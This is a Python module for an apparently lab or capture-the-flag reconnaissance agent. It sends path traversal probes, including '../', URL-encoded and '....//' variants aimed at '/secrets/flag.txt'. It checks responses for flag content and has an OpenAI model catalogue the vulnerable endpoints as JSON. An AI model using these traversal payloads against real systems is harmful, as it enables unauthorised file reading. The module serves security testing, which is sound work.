"""
Reconnaissance Agent — scans the target application and catalogs
the attack surface into a strict ReconOutput schema.

Uses the LLM to reason about discovered endpoints and cross-reference
known vulnerability patterns.
"""

from __future__ import annotations

import json
import logging
from typing import Optional

import requests
from openai import OpenAI

from app.config import LLM_MODEL, LLM_TEMPERATURE, OPENAI_API_KEY
from app.schemas import ReconOutput
from app.telemetry import trace_operation

logger = logging.getLogger(__name__)

_client: Optional[OpenAI] = None


def _get_client() -> OpenAI:
    global _client
    if _client is None:
        _client = OpenAI(api_key=OPENAI_API_KEY)
    return _client


def _probe_target(target_url: str) -> str:
    """
    Perform basic HTTP probing of the target to gather raw data
    for the LLM to reason about. Returns a compact summary string.
    """
    findings: list[str] = []
    base = target_url.rstrip("/")

    # Probe common paths including path traversal attempts via /files/
    probe_paths = [
        "/",
        "/health",
        "/admin",
        "/files/readme.txt",
        "/files/../secrets/flag.txt",
        "/files/..%2Fsecrets%2Fflag.txt",
        "/files/....//secrets/flag.txt",
    ]

    for path in probe_paths:
        try:
            url = f"{base}{path}"
            resp = requests.get(url, timeout=5, allow_redirects=False)
            header_info = {
                "server": resp.headers.get("Server", "unknown"),
                "content-type": resp.headers.get("Content-Type", "unknown"),
            }

            body_preview = resp.text[:200] if resp.status_code == 200 else ""
            findings.append(
                f"GET {path} -> {resp.status_code} | "
                f"headers={json.dumps(header_info)} | "
                f"body_length={len(resp.text)} | "
                f"body_preview={body_preview!r}"
            )

            # Flag path traversal indicators
            if "FLAG{" in resp.text:
                findings.append(
                    f"  [!] PATH TRAVERSAL CONFIRMED at {path}: "
                    f"response contains secret flag content"
                )
        except requests.RequestException as exc:
            findings.append(f"GET {path} -> ERROR: {exc}")

    return "\n".join(findings)


def run_recon(target_url: str) -> ReconOutput:
    """
    Execute reconnaissance against *target_url* and return a typed
    ReconOutput with the catalogued attack surface.
    """
    with trace_operation(
        "recon_agent",
        attributes={"agent.name": "recon", "agent.target_url": target_url},
    ) as span:
        # Step 1: deterministic probe
        probe_data = _probe_target(target_url)
        logger.info("Recon probe complete:\n%s", probe_data)
        span.set_attribute("recon.probe_lines", probe_data.count("\n") + 1)

        # Step 2: LLM-assisted analysis with structured output
        client = _get_client()

        # Provide a concrete JSON example to anchor the LLM's output
        example_json = json.dumps({
            "target_url": "http://example.com",
            "detected_framework": "Flask/Werkzeug",
            "vulnerable_endpoints": [
                {
                    "path": "/files/../secrets/flag.txt",
                    "method": "GET",
                    "injection_vector": "Path traversal via ../ sequences in filename parameter"
                }
            ]
        }, indent=2)

        system_prompt = (
            "You are a security reconnaissance agent. Analyze the HTTP probe "
            "results below and identify ALL vulnerable endpoints.\n\n"
            "You MUST return valid JSON with EXACTLY this structure:\n"
            f"```json\n{example_json}\n```\n\n"
            "Rules:\n"
            "- target_url: the base URL of the target (string)\n"
            "- detected_framework: the server/framework from headers (string)\n"
            "- vulnerable_endpoints: array of objects, each with path, method, injection_vector\n"
            "- method must be one of: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS\n"
            "- Focus on path traversal, injection, SSRF vulnerabilities\n"
            "- If a probe returned secret/flag content, that endpoint IS vulnerable\n"
            "- Do NOT return an empty object. Always include all three required fields.\n"
        )

        response = client.chat.completions.create(
            model=LLM_MODEL,
            temperature=LLM_TEMPERATURE,
            response_format={"type": "json_object"},
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": f"Target: {target_url}\n\nProbe results:\n{probe_data}"},
            ],
        )

        raw_json = response.choices[0].message.content
        logger.info("LLM recon response: %s", raw_json[:500])
        span.set_attribute("llm.prompt_tokens", response.usage.prompt_tokens)
        span.set_attribute("llm.completion_tokens", response.usage.completion_tokens)
        span.set_attribute("agent.decision_rationale", raw_json[:500])

        # Step 3: validate through Pydantic contract
        try:
            result = ReconOutput.model_validate_json(raw_json)
        except Exception as exc:
            # Fallback: if LLM output is malformed, construct from probe data
            logger.warning("LLM output failed validation (%s), using probe fallback", exc)
            result = _fallback_recon(target_url, probe_data)

        logger.info("Recon found %d vulnerable endpoints", len(result.vulnerable_endpoints))
        return result


def _fallback_recon(target_url: str, probe_data: str) -> ReconOutput:
    """
    Deterministic fallback if the LLM returns garbage.
    Parses probe_data directly for path traversal indicators.
    """
    from app.schemas import VulnerableEndpoint, HttpMethod

    endpoints = []
    if "[!] PATH TRAVERSAL CONFIRMED" in probe_data:
        endpoints.append(
            VulnerableEndpoint(
                path="/files/../secrets/flag.txt",
                method=HttpMethod.GET,
                injection_vector="Path traversal via ../ sequences in the filename parameter allows reading files outside the public directory",
            )
        )

    return ReconOutput(
        target_url=target_url,
        detected_framework="Flask/Werkzeug",
        vulnerable_endpoints=endpoints,
    )
